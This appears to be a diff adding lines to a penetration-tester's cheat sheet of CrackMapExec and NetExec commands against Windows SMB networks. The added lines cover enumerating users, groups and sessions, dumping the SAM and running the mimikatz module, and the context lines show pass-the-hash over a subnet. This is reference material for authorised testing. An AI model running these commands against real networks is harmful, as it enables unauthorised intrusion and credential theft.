@@ -1414,6 +1414,16 @@ crackmapexec smb 192.168.45.0/24 -u Administrator -H LM:NT --local-auth
 crackmapexec smb 192.168.45.0/24 -u Administrator -H NT
 https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
 
+crackmapexec smb internal.txt -u Administrator -p Password1#
+	--users
+	--groups
+	--local-users
+	--gen-relay-list output.txt
+	--sessions
+	--lusers
+	--local-auth --sam
+	-M mimikatz
+
 nxc smb 10.0.0.0/24 -u domain_user -p Password1# --shares
 	--users
 	--groups
